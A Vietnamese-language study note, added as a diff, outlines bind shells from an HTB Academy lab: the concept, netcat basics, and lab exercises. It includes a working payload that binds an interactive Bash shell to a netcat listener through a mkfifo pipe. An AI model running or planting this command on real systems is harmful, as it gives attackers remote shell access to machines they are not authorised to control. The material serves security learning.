@@ -1,0 +1,83 @@
+Bind Shells (HTB Academy)
+│
+├── 1. Khái niệm
+│   ├── Shell: công cụ điều khiển hệ thống từ xa (CLI).
+│   ├── Bind Shell:
+│   │   - Target (nạn nhân) mở listener trên 1 port.
+│   │   - Attacker kết nối đến port đó.
+│   └── Reverse Shell: target chủ động kết nối ngược (sẽ học sau).
+│
+├── 2. Cách hoạt động
+│   ├── Target = server → mở listener, chờ client.
+│   ├── Attacker = client → kết nối đến listener.
+│   └── Khó khăn:
+│       - Cần có listener trên target.
+│       - Firewall/NAT chặn incoming traffic.
+│       - OS firewall (Win/Linux) ngăn kết nối không tin cậy.
+│
+├── 3. Công cụ: Netcat (nc)
+│   ├── Được gọi là “Swiss-Army Knife”.
+│   ├── Hỗ trợ TCP, UDP, IPv4/6, Unix sockets.
+│   ├── Tính năng: proxy, đọc/ghi text, mở socket.
+│   └── Sử dụng trong bind shell:
+│       - Server = target → chạy lệnh listener.
+│       - Client = attacker → kết nối tới listener.
+│
+├── 4. Thực hành Bind Shell với Netcat (phiên TCP cơ bản)
+│   ├── Trên target (server):
+│   │   ```bash
+│   │   nc -lvnp 7777
+│   │   ```
+│   │   → Lắng nghe trên port 7777.
+│   │
+│   ├── Trên attacker (client):
+│   │   ```bash
+│   │   nc -nv <target_ip> 7777
+│   │   ```
+│   │   → Kết nối tới target.
+│   │
+│   ├── Kiểm tra trao đổi dữ liệu:
+│   │   - Gõ text từ client → server nhận.
+│   │   - Ví dụ:
+│   │     Client: `Hello Academy`
+│   │     Server nhận: `Hello Academy`
+│   │
+│   └── Lưu ý: Đây mới chỉ là TCP session, chưa điều khiển OS.
+│
+├── 5. Thiết lập Bind Shell thực sự (có tương tác với OS)
+│   ├── Trên target (server) – tạo shell Bash gắn vào Netcat:
+│   │   ```bash
+│   │   rm -f /tmp/f; mkfifo /tmp/f; \
+│   │   cat /tmp/f | /bin/bash -i 2>&1 | \
+│   │   nc -l <target_ip> 7777 > /tmp/f
+│   │   ```
+│   │   → Payload: mở Bash shell và redirect I/O qua Netcat.
+│   │
+│   ├── Trên attacker (client) – kết nối để nhận shell:
+│   │   ```bash
+│   │   nc -nv <target_ip> 7777
+│   │   ```
+│   │   → Lúc này attacker gõ lệnh trực tiếp trên shell của target.
+│   │
+│   └── Ý nghĩa: đã có shell tương tác (thực sự) trên target.
+│
+├── 6. Nhận xét & Ứng dụng
+│   ├── Ưu điểm:
+│   │   - Cách thức đơn giản.
+│   │   - Hữu ích trong môi trường lab/test.
+│   ├── Nhược điểm:
+│   │   - Dễ bị firewall phát hiện & chặn.
+│   │   - Dễ bị IDS/IPS và endpoint security cảnh báo.
+│   ├── Thực tế: thường ít dùng, thay bằng reverse shell.
+│   └── Ý nghĩa học tập: giúp hiểu rõ cơ chế cơ bản của shell.
+│
+└── 7. Bài tập/Câu hỏi thường gặp
+    ├── Nếu target mở nc trên port 443:
+    │   - Attacker phải kết nối bằng:
+    │     ```bash
+    │     nc -nv <target_ip> 443
+    │     ```
+    ├── Thực hành:
+    │   - SSH vào target, tạo bind shell.
+    │   - Kết nối nc từ attacker → kiểm tra.
+    └── Tìm và đọc file flag.txt để xác nhận.
